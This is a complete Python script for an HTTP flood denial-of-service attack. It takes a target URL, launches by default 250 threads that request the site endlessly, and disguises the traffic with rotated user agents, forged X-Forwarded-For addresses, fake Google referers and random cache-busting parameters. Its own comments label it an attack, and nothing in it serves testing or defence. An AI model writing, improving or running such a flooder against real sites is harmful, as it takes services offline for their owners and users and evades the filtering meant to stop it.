import threading
import random
import requests
import string
import time

# User-Agents pool (for rotation)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1)",
    "Mozilla/5.0 (Android 9; Mobile; rv:68.0)"
]

# Function to generate random strings
def rand_str(length=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Advanced header builder to mimic legit traffic
def generate_headers():
    return {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Referer': f"https://google.com/search?q={rand_str()}",
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
        'Cookie': f"id={rand_str(16)}"
    }

# The main attack function
def attack(url):
    while True:
        try:
            response = requests.get(
                url,
                headers=generate_headers(),
                params={rand_str(): rand_str()},
                timeout=5
            )
            print(f"[{response.status_code}] -> {url}")
        except requests.exceptions.RequestException:
            pass

# Launch the attack with multi-threading
def start_attack(url, threads=250):
    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(url,))
        thread.daemon = True
        thread.start()

# Input target from user
target_url = input("Enter target URL (include http/https): ")
threads_count = int(input("Threads (default 250): ") or 250)

print(f"Launching attack on {target_url} with {threads_count} threads...")
start_attack(target_url, threads_count)

while True:
    time.sleep(1)
